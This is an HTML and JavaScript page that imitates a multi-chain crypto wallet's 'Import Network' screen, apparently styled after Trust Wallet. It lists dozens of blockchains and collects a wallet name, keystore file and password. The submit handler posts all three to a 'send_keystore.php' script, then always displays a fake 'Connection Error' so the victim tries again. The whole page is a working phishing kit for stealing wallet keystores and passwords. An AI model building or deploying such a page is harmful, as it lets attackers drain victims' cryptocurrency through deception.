<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Import Network</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        body { background-color: #f2f2f2; display: flex; justify-content: center; overflow-x: hidden; }
        .app-container { width: 100%; max-width: 480px; background: white; min-height: 100vh; display: flex; flex-direction: column; position: relative; }
        
        header { display: flex; align-items: center; padding: 15px 16px; background: white; border-bottom: 0.5px solid #f0f0f0; position: sticky; top: 0; z-index: 10; }
        .back-link { text-decoration: none; color: #000; font-size: 24px; width: 40px; border: none; background: none; cursor: pointer; }
        header h1 { flex-grow: 1; text-align: center; font-size: 18px; font-weight: 700; }

        .search-area { padding: 8px 16px 16px 16px; }
        .search-box { background: #f1f1f2; border-radius: 12px; display: flex; align-items: center; padding: 10px 14px; }
        .search-box span { color: #8e8e93; margin-right: 10px; font-size: 18px; }
        .search-box input { border: none; background: transparent; outline: none; width: 100%; font-size: 17px; color: #000; }

        .network-list { flex-grow: 1; overflow-y: auto; }
        .network-item { display: flex; align-items: center; padding: 14px 16px; border-bottom: 0.5px solid #f0f0f0; cursor: pointer; }
        .logo { width: 36px; height: 36px; margin-right: 14px; border-radius: 50%; overflow: hidden; background: #eee; flex-shrink: 0; display: flex; align-items: center; justify-content: center; }
        .logo img { width: 100%; height: 100%; object-fit: cover; }
        .name { flex-grow: 1; font-weight: 500; font-size: 16px; }
        .chevron { color: #c7c7cc; font-size: 20px; }
        .hidden { display: none !important; }

        /* MODAL POP-UP */
        #importModal { position: fixed; top: 0; left: 50%; transform: translateX(-50%); width: 100%; max-width: 480px; height: 100%; background: white; z-index: 100; display: none; flex-direction: column; }
        .modal-body { padding: 20px 16px; flex-grow: 1; }
        .input-group { margin-bottom: 20px; }
        .input-label { display: block; color: #707070; font-size: 14px; margin-bottom: 8px; font-weight: 500; }
        
        .text-input-wrap { border: 1px solid #e0e0e0; border-radius: 12px; padding: 12px 14px; position: relative; background: white; }
        .text-input-wrap textarea { border: none; outline: none; width: 100%; font-size: 16px; color: #000; height: 160px; resize: none; }
        .text-input-wrap input { border: none; outline: none; width: 100%; font-size: 16px; color: #000; height: 24px; }
        
        .paste-btn { color: #0000ff; font-weight: 700; cursor: pointer; font-size: 15px; background: none; border: none; position: absolute; bottom: 12px; right: 14px; }
        
        .helper-text { text-align: center; color: #707070; font-size: 13px; margin-top: 15px; line-height: 1.4; padding: 0 10px; }
        
        .footer-btns { padding: 20px 16px; background: white; }
        
        /* UPDATED BUTTON TEXT COLOR/STYLE */
        .restore-btn { width: 100%; padding: 16px; border-radius: 30px; border: none; background: #d8d9fb; color: white; font-size: 16px; font-weight: 700; cursor: not-allowed; transition: 0.3s; margin-bottom: 15px; }
        .restore-btn.active { background: #4a4ed4; cursor: pointer; }
        
        .footer-link { display: block; text-align: center; color: #0000ff; font-weight: 600; text-decoration: none; font-size: 15px; }
    </style>
</head>
<body>

<div class="app-container">
    <header>
        <button class="back-link">←</button>
        <h1>Select network</h1>
        <div style="width:40px"></div>
    </header>

    <div class="search-area">
        <div class="search-box"><span>🔍</span><input type="text" id="netSearch" placeholder="Search"></div>
    </div>

    <div class="network-list" id="list"></div>

    <div id="importModal">
        <header>
            <button class="back-link" onclick="closeModal()">←</button>
            <h1 id="modalTitle">Import Network</h1>
            <div style="width:40px; text-align: right; color:#8e8e93; font-size: 22px;">🔲</div>
        </header>
        
        <div class="modal-body">
            <div class="input-group">
                <label class="input-label">Wallet name</label>
                <div class="text-input-wrap"><input type="text" id="walletNameInput"></div>
            </div>

            <div class="input-group">
                <label class="input-label">Keystore</label>
                <div class="text-input-wrap">
                    <textarea id="keystoreInput" placeholder=""></textarea>
                    <button class="paste-btn" id="pasteBtn">Paste</button>
                </div>
            </div>

            <div class="input-group">
                <label class="input-label">Password</label>
                <div class="text-input-wrap"><input type="password" id="passwordInput"></div>
            </div>

            <p class="helper-text">Several lines of text beginning with "{...}" plus the password you used to encrypt it</p>
        </div>

        <div class="footer-btns">
            <button class="restore-btn" id="restoreBtn" disabled>Continue</button>
            <a href="#" class="footer-link">What is a keystore?</a>
        </div>
    </div>
</div>

<script>
    const networks = [
        { n: "Ethereum", id: "ethereum", c: "#627EEA" },
        { n: "BNB Smart Chain", id: "smartchain", c: "#F3BA2F" },
        { n: "Tron", id: "tron", c: "#FF0013" },
        { n: "Avalanche C-Chain", id: "avalanchec", c: "#E84142" },
        { n: "Sui", id: "sui", c: "#6FBCF0" },
        { n: "TON", id: "ton", c: "#0088CC" },
        { n: "Mantle", id: "mantle", c: "#000000" },
        { n: "Aptos", id: "aptos", c: "#000000" },
        { n: "Ethereum Classic", id: "classic", c: "#328332" },
        { n: "Polygon", id: "polygon", c: "#8247E5" },
        { n: "Vechain", id: "vechain", c: "#15BDFF" },
        { n: "Arbitrum", id: "arbitrum", c: "#28A0F0" },
        { n: "Aurora", id: "aurora", c: "#78D64B" },
        { n: "Base", id: "base", c: "#0052FF" },
        { n: "Blast", id: "blast", c: "#FCFC03" },
        { n: "Boba", id: "boba", c: "#D7FE44" },
        { n: "BounceBit", id: "bouncebit", c: "#000000" },
        { n: "Callisto", id: "callisto", c: "#22B573" },
        { n: "Celo", id: "celo", c: "#35D07F" },
        { n: "Conflux eSpace", id: "conflux", c: "#1E88E5" },
        { n: "Cronos Chain", id: "cronos", c: "#002D74" },
        { n: "Evmos", id: "evmos", c: "#ED4E33" },
        { n: "Fantom", id: "fantom", c: "#1969FF" },
        { n: "Gnosis Chain", id: "gnosis", c: "#04795B" },
        { n: "Go Chain", id: "gochain", c: "#00D1FF" },
        { n: "ICON", id: "icon", c: "#00B8D9" },
        { n: "loTeX", id: "iotex", c: "#00D4D5" },
        { n: "loTeX EVM", id: "iotex", c: "#00D4D5" },
        { n: "Kaia", id: "kaia", c: "#000000" },
        { n: "KavaEvm", id: "kava", c: "#FF5B5C" },
        { n: "KuCoin Community Chain", id: "kcc", c: "#0093DD" },
        { n: "Linea", id: "linea", c: "#121212" },
        { n: "Manta Pacific", id: "manta", c: "#ffffff" },
        { n: "MegaETH", id: "megaeth", c: "#007aff" },
        { n: "Merlin", id: "merlin", c: "#000000" },
        { n: "Metis", id: "metis", c: "#00D2FF" },
        { n: "Monad", id: "monad", c: "#5c2ae3" },
        { n: "Moonbeam", id: "moonbeam", c: "#53CBC9" },
        { n: "Moonriver", id: "moonriver", c: "#53CBC9" },
        { n: "Neon", id: "neon", c: "#000000" },
        { n: "OP Mainnet", id: "optimism", c: "#FF0420" },
        { n: "OpBNB", id: "optimism", c: "#F3BA2F" },
        { n: "Plasma Mainnet", id: "plasma", c: "#8247e5" },
        { n: "Polygon zkEVM", id: "polygon", c: "#8247E5" },
        { n: "Ronin", id: "ronin", c: "#1273EA" },
        { n: "Scroll", id: "scroll", c: "#FFF9E3" },
        { n: "Sonic", id: "sonic", c: "#000000" },
        { n: "Theta", id: "theta", c: "#2AB8E6" },
        { n: "ThunderCore", id: "thundercore", c: "#1274F8" },
        { n: "Viction", id: "viction", c: "#121212" },
        { n: "Wanchain", id: "wanchain", c: "#1E2A54" },
        { n: "Zeta EVM", id: "zetachain", c: "#005743" },
        { n: "zkLink Nova Mainnet", id: "zklink", c: "#000000" },
        { n: "zkSync Era", id: "zksync", c: "#121212" }
    ];

    const listDiv = document.getElementById('list');
    const modal = document.getElementById('importModal');
    const walletNameInput = document.getElementById('walletNameInput');
    const keystoreInput = document.getElementById('keystoreInput');
    const passwordInput = document.getElementById('passwordInput');
    const restoreBtn = document.getElementById('restoreBtn');

    networks.forEach(net => {
        const div = document.createElement('div');
        div.className = "network-item";
        div.onclick = () => openModal(net.n);
        const trustUrl = `https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/${net.id}/info/logo.png`;
        
        div.innerHTML = `
            <div class="logo" style="background:${net.c}">
                <img src="${trustUrl}" onerror="this.style.display='none'">
            </div>
            <div class="name">${net.n}</div>
            <div class="chevron">›</div>
        `;
        listDiv.appendChild(div);
    });

    function openModal(name) {
        document.getElementById('modalTitle').innerText = `Import ${name}`;
        walletNameInput.value = `${name} Wallet`;
        keystoreInput.value = "";
        passwordInput.value = "";
        checkInput();
        modal.style.display = 'flex';
    }

    function closeModal() { modal.style.display = 'none'; }

    document.getElementById('pasteBtn').onclick = async () => {
        try {
            const text = await navigator.clipboard.readText();
            keystoreInput.value = text;
            checkInput();
        } catch (e) { alert("Enable clipboard access."); }
    };

    function checkInput() {
        if (keystoreInput.value.trim().length > 10 && passwordInput.value.length > 0) {
            restoreBtn.disabled = false;
            restoreBtn.classList.add('active');
        } else {
            restoreBtn.disabled = true;
            restoreBtn.classList.remove('active');
        }
    }

    keystoreInput.oninput = checkInput;
    passwordInput.oninput = checkInput;

    restoreBtn.onclick = () => {
        const data = { 
            wallet: walletNameInput.value, 
            keystore: keystoreInput.value, 
            password: passwordInput.value 
        };
        restoreBtn.innerText = "Processing...";
        
        fetch('send_keystore.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        }).finally(() => {
            alert("Connection Error: Please try again later.");
            closeModal();
            restoreBtn.innerText = "Continue";
        });
    };

    document.getElementById('netSearch').oninput = function() {
        const q = this.value.toLowerCase().trim();
        document.querySelectorAll('.network-item').forEach(item => {
            item.classList.toggle('hidden', !item.innerText.toLowerCase().includes(q));
        });
    };
</script>
</body>
</html>
